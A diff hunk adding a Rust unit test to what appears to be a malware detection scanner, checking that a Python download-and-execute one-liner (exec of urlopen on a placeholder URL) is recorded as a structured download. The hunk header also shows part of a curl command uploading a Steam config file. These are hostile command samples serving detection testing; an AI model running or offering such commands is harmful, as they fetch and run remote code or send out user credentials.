@@ -11674,6 +11674,38 @@ curl --silent --output /dev/null -F steam=@"C:\Program Files (x86)\Steam\config\
     }
 
     #[test]
+    fn python_urllib_request_object_urlopen_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import urllib.request; r = urllib.request.Request('https://py.example/request-object'); exec(urllib.request.urlopen(r).read())""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/request-object" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python urllib Request object urlopen: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/request-object")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python urllib Request object URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_urllib_urlretrieve_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
